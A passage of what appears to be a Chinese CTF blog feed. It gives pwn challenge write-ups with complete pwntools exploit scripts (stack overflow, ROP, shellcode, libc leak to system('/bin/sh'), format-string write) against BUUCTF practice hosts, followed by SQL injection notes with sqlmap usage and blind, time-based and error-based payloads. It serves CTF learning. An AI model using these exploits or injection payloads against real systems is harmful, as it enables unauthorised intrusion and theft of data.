class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25689</span>)<br>x=<span class="hljs-number">0x804A02C</span><br>p=p32(x)+b<span class="hljs-string">&#x27;%11$n&#x27;</span><br><span class="hljs-built_in">io</span>.sendline(p)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/02/26/KZnWXXI8.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>周题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn-第五周</title>
    <link href="/2023/02/18/pwn-%E7%AC%AC%E4%BA%94%E5%91%A8/"/>
    <url>/2023/02/18/pwn-%E7%AC%AC%E4%BA%94%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p>检查，只有nx</p><p><img src="https://img1.imgtp.com/2023/02/19/v6NySUvB.jpg"></p><p>在main函数中使用gets溢出</p><p>由于没有ebp，不需要进行覆盖</p><p><img src="https://img1.imgtp.com/2023/02/19/corKIqSH.jpg"></p><p>flag的内容被写到了bss段</p><p>开始不知道怎么做，看了wp发现可以使用write函数读出</p><p>可以使用write读出</p><p><img src="https://img1.imgtp.com/2023/02/19/Hl4OcxVs.jpg"></p><p><img src="https://img1.imgtp.com/2023/02/19/Zat9WhKH.jpg"></p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&quot;node4.buuoj.cn&quot;,27057)<br><span class="hljs-attribute">fff_addr</span>=0x080489A0#将flag写入bss段的函数地址<br><span class="hljs-attribute">flag_addr</span>=0x080ECA2D#fl4g首地址<br><span class="hljs-attribute">write_addr</span>=0x0806E270<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x2d)+p32(fff_addr)+p32(write_addr)+p32(0)+p32(1)+p32(flag_addr)+p32(45)<br>io.sendline(p)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/02/19/ZqB4vcSH.jpg"></p><h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><p>检查，发现新东西</p><p><img src="https://img1.imgtp.com/2023/02/19/uCLE2Oyu.jpg"></p><p>RWX：Has RtsWX segmen&#x2F;&#x2F;具有RWX段</p><p>r(read,读取)：有读取文件内容的权限；有浏览目录的权限<br>w(Write,写入)：有新增,修改,删除文件内容的权限；对目录来说，具有新建，删除，修改，移动目录内文件的权限<br>x(eXecute，执行)：具有执行文件的权限；具有进入目录的权限。</p><p>在ida中只发现了text可以进行溢出，而name的内容是在bss段</p><p><img src="https://img1.imgtp.com/2023/02/19/szE5aki9.jpg"></p><p><img src="https://img1.imgtp.com/2023/02/19/UeCxSLu4.jpg"></p><p>bss段有rw权限</p><p><img src="https://img1.imgtp.com/2023/02/19/MXVUdoK6.jpg"></p><p>向name传入shellcode，通过text溢出执行</p><p>exp</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-built_in">os</span> = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25198</span>)<br>shell=asm(shellcraft.sh())<br>name_addr=<span class="hljs-number">0x601080</span><br>p=b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>)+p64(name_addr)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&#x27;name&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendline(shell)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&#x27;me?&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendline(p)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/02/19/VOaPapSW.jpg"></p><h1 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h1><p>只开启了不可执行</p><p><img src="https://img1.imgtp.com/2023/02/19/0QHplw2i.jpg"></p><p>看伪代码，发现于flag有关</p><p><img src="https://img1.imgtp.com/2023/02/19/SlvK5qZ4.jpg"></p><p>dest的内容就是src中的，src则在addlog中输入，src可以有128个字符</p><p><img src="https://img1.imgtp.com/2023/02/19/usvtW1X6.jpg"></p><p>从Addlog输入payloa，在GetFlag中利用</p><p><img src="https://img1.imgtp.com/2023/02/19/L5N31Ug2.jpg"></p><p><img src="https://img1.imgtp.com/2023/02/19/r8eNDAVy.jpg"></p><p>exp</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27225</span>)<br>elf=ELF(<span class="hljs-string">&#x27;ciscne5&#x27;</span>)<br>sys=<span class="hljs-number">0x080484d0</span><br>bs=<span class="hljs-number">0x080482ea</span><br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&#x27;password&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendline(b<span class="hljs-string">&#x27;administrator&#x27;</span>)<br>p=b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">4</span>)+p32(sys)+b<span class="hljs-string">&#x27;aaaa&#x27;</span>+p32(bs)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&#x27;Exit\n&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendline(str(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&#x27;info:&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendline(p)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&#x27;Exit\n&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendline(b<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/02/19/AVdReLjy.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>周题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn-第四周</title>
    <link href="/2023/02/07/pwn-%E7%AC%AC%E5%9B%9B%E5%91%A8/"/>
    <url>/2023/02/07/pwn-%E7%AC%AC%E5%9B%9B%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>检查，只开启了nx</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-09-232323.5ytkqwvva5c0.webp"></p><p>主函数中存在栈溢出</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-12-094741.e52pq50apsg.webp"></p><p>要在get_flag函数中使v1与v2等于特定值</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-12-094722.6v3960nlyds0.webp"></p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2023-02-12-095051.4w0rkok7y3y0.webp"></p><p>由于不存在push ebp，0x38后便是返回地址</p><p>可以将返回地址溢出为带参数的</p><p><strong>程序异常退出会没有回显</strong>，可以将返回地址设置为exit的地址</p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&quot;node4.buuoj.cn&quot;,29334)<br><span class="hljs-attribute">flag_addr</span>=0x080489a0<br><span class="hljs-attribute">exit_addr</span>=0x0804E6A0<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x38)+p32(flag_addr)+p32(exit_addr)+p32(0x308CD64F)+p32(0x195719D1)<br>io.sendline(p)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-12-095542.6bj4zk67fyg0.webp"></p><h1 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h1><p>开启了nx和relro</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-12-100859.5svt70kow400.webp"></p><p>查看伪代码</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-12-124739.5bs0m57buds0.webp"></p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2023-02-12-124800.22ybo029mvz4.webp"></p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2023-02-12-124818.3egqq0e6che0.webp"></p><p>当a1不等于127，可以进行溢出</p><p>对于strncmp，可以使用\x00进行截断</p><p>buf[7]便是a1</p><p>没有flag的相关信息，也没有system，</p><p>使用write泄露libc</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-12-110521.36h86pkw02g0.webp"></p><p>使用LibcSearcher库</p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><span class="hljs-attribute">io</span>=remote(&quot;node4.buuoj.cn&quot;,29075)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./badypro&#x27;)<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">main_add</span>=0x8048825<br><span class="hljs-attribute">p1</span>=b&#x27;\x00&#x27;+b&#x27;a&#x27;*6+b&#x27;\xff&#x27;<br>io.sendline(p1)<br>io.recvuntil(<span class="hljs-string">&#x27;Correct\n&#x27;</span>)<br><span class="hljs-attribute">p2</span>=b&#x27;a&#x27;*(0xe7+4)+p32(write_plt)+p32(main_add)+p32(1)+p32(write_got)+p32(4)<br>io.sendline(p2)<br><span class="hljs-attribute">write_add</span>=u32(io.recv(4))<br><span class="hljs-built_in">print</span>(hex(write_add))<br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write_add)<br>libc_base = write_add -  libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<br>sys = libc_base+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>bs= libc_base+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>io.sendline(p1)<br>io.recvuntil(<span class="hljs-string">&#x27;Correct\n&#x27;</span>)<br><span class="hljs-attribute">p3</span>=b&#x27;a&#x27;*(0xe7+4)+p32(sys)+p32(1)+p32(bs)<br>io.sendline(p3)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2023-02-12-125717.2rqpbjacn3c0.webp"></p><h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><p>开启了nx</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2023-02-12-130320.2x4odycmwrq0.webp"></p><p>存在system与&#x2F;bin&#x2F;sh</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2023-02-12-133023.30jycuy636q0.webp"></p><p>找到栈溢出点</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-12-133004.48943foqxni0.webp"></p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&quot;node4.buuoj.cn&quot;,26804)<br><span class="hljs-attribute">sys</span>=0x4004C0<br><span class="hljs-attribute">bs</span>=0x600A90<br><span class="hljs-attribute">rdi</span>=0x4006b3<br><span class="hljs-attribute">ret</span>=0x4004a1<br>io.recvuntil(<span class="hljs-string">&#x27;Input:&#x27;</span>)<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x80+8)+p64(ret)+p64(rdi)+p64(bs)+p64(sys)<br>io.sendline(p)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2023-02-12-133048.52oixg511xo0.webp"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>周题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/02/05/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/02/05/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><h2 id="1-寻找注入点"><a href="#1-寻找注入点" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h2><p>（与数据库交互的地方）</p><p>​参数可控；</p><p>常见点：</p><p>​1. 表单中的输入参数</p><ol start="2"><li><p>URL中的参数</p></li><li><p>Cookie或header头中其它参数</p></li></ol><p>用户信息、排名公布、文章展示、评论、搜索框、登陆框、cookie（session持久化需要存储在数据库中）</p><h2 id="2-找到闭合符"><a href="#2-找到闭合符" class="headerlink" title="2.找到闭合符"></a>2.找到闭合符</h2><h2 id="3-注释"><a href="#3-注释" class="headerlink" title="3.注释"></a>3.注释</h2><p>1.单行注释：</p><p>#后直接加内容；</p><p>——后面必须要加空格</p><p>2.多行注释：</p><p> &#x2F;**&#x2F;中间可以跨行，不一定要跨</p><p>3.内联注释（是MySQL数据库为了保持与其他数据库兼容，特意新添加的功能）：</p><p>(在过滤时可以代替空格)</p><p> 为了避免从MySQL中导出的SQL语句不能被其他数据库使用，它把一些MySQL特有的语句放在 &#x2F;*! … *&#x2F;中，这些语句在不兼容的数据库中使用时便不会执行。而MySQL自身却能识别、执行。</p><p>&#x2F;*!50001 *&#x2F;表示数据库版本&gt;&#x3D;5.00.01时中间的语句才会执行，在SQL注入中，内联注释常用来绕过waf。</p><h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/image.1w96op86cups.webp"></p><h1 id="数据库查询常用语句"><a href="#数据库查询常用语句" class="headerlink" title="数据库查询常用语句"></a>数据库查询常用语句</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">库：<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata;<br><br>表：<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;库名&#x27;</span>；<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;库名&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>；<br><br>字段：<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;表名&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;库名&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;表名&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;库名&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>;<br><br>数据：<br><span class="hljs-keyword">select</span> group_concat(字段名,<span class="hljs-number">0x3a</span>,字段名) <span class="hljs-keyword">from</span> 库名.表名；<br></code></pre></td></tr></table></figure><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-h帮助信息</span><br><span class="hljs-deletion">-u目标 URL</span><br><span class="hljs-deletion">-dbs枚举所有数据库名</span><br><span class="hljs-deletion">-current-db获取当前数据库名</span><br><span class="hljs-deletion">-D指定数据库</span><br><span class="hljs-deletion">-tables枚举所有表名</span><br><span class="hljs-deletion">-T指定数据表</span><br><span class="hljs-deletion">-columns枚举所有字段名</span><br><span class="hljs-deletion">-C指定数据列</span><br><span class="hljs-deletion">-dump获取数据内容</span><br><span class="hljs-deletion">-p指定参数</span><br><span class="hljs-deletion">--data使用 POST 发送数据串</span><br><span class="hljs-deletion">-r从文件中读取 HTTP 请求</span><br><span class="hljs-deletion">--level设置测试等级（1-5，默认为 1）</span><br><span class="hljs-deletion">--risk设置测试风险等级（1-3，默认为 1）</span><br><span class="hljs-deletion">--random-agent随机ua进行测试</span><br><span class="hljs-deletion">--cookie指定cookie</span><br><span class="hljs-deletion">--os-shell调出交互式shell</span><br><span class="hljs-deletion">--dbms指定数据库类型</span><br><span class="hljs-deletion">--os指定操作系统</span><br><span class="hljs-deletion">--threads设置请求并发数最大值（默认 1）</span><br></code></pre></td></tr></table></figure><p>链接：<a href="https://app.yinxiang.com/fx/a2dd7f1f-f40a-4315-be93-7c4124073e67">sqlmap参数详解 (yinxiang.com)</a></p><h2 id="get"><a href="#get" class="headerlink" title="get"></a>get</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u 路径  -<span class="hljs-selector-tag">p</span> 注入点,注入点<br></code></pre></td></tr></table></figure><h2 id="post"><a href="#post" class="headerlink" title="post"></a>post</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u 路径 <span class="hljs-attr">--data</span>=<span class="hljs-string">&quot;post传入的内容&quot;</span> -<span class="hljs-selector-tag">p</span> 注入点,注入点<br>python sqlmap<span class="hljs-selector-class">.py</span> -u 路径 -r 数据包<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> 注入点,注入点<br></code></pre></td></tr></table></figure><h2 id="level"><a href="#level" class="headerlink" title="level"></a>level</h2><p>跑不出可以增加等级，最好将检测过的除去</p><p>–level&#x3D;</p><p>（默认）1</p><p>2cookie</p><p>（建议）3user-agent</p><p>5host</p><p>–risk&#x3D;</p><p>1大部分语句</p><p>2增加基于事件的语句</p><p>（建议）3增加基于or的语句</p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>适用于页面没有回显字段不支持联合查询和报错注入，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 或 false 使web页面返回 true 或 false，从而达到注入的目的来获取信息</p><p>单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and 1 及 and 0来判断sql语句有没有成功执行，如果sql语句执行了说明你的闭合符号找对了</p><p>——————</p><p>例如：</p><p>输入 id &#x3D; 1’ and 1 – + 页面内容显示正常</p><p>输入 id &#x3D; 1’ and 0– + 页面内容显示不正常</p><h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><p>盲注的一种，在页面没有回显和报错，也不能通过拼接 and 0 、and 1 的布尔表达式来判断sql语句是否成功执行，只能在参数后and sleep(5) ， 加上延时函数sleep()， 如果sql语句执行页面刷新就会有一定的延时，根据页面是否有延时来判断sql语句执行与否所以叫做延时注入</p><p>——————</p><p>单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and sleep(5) 来判断sql语句有没有成功执行，如果sql语句执行了说明你的闭合符号找对了</p><p>——</p><p>例如</p><p>判断数据库名长度，成功会延时 3s</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if(<span class="hljs-name">length</span>(<span class="hljs-name">database</span>())=8,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>) -- +<br></code></pre></td></tr></table></figure><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>mysql中的一些函数在报错时，会抛出错误代码，借此可以执行一些特定的sql语句来获取数据库的信息在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页面能够抛出报错的代码信息，就可以利用报错回显，来查看注入的sql语句的执行结果；</p><p>嵌套的函数中，内部函数先执行；</p><h2 id="报错常用函数"><a href="#报错常用函数" class="headerlink" title="报错常用函数"></a>报错常用函数</h2><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> cout(*),concat(<span class="hljs-keyword">user</span>(),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a);<br></code></pre></td></tr></table></figure><p>floor()报错注入的原因是 group by 在向临时表插入数据时，由于 rand() 多次计算导致插入临时表时主键重复，从而报错，又因为报错前 concat() 中的 SQL 语句或函数被执行，所以该语句报错且被抛出的主键是 SQL 语句或函数执行后的结果。<br>该函数最大显示长度为64，超过长度可以配合 substr、limit 等函数来显示</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">user</span>()),0x7e)))</span>;<br></code></pre></td></tr></table></figure><p>从目标XML中返回包含所查询值的字符串，如果Xpath格式语法书写错误的话，就会报错。</p><p>该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">user</span>()),0x7e),1))</span>;<br></code></pre></td></tr></table></figure><p>updatexml的第二个参数需要Xpath格式的字符串，是用&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出</p><p>该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p><h3 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h3><h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (geometrycollection((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">user</span>())a)b))</span>;<br></code></pre></td></tr></table></figure><h3 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span><br></code></pre></td></tr></table></figure><h3 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span 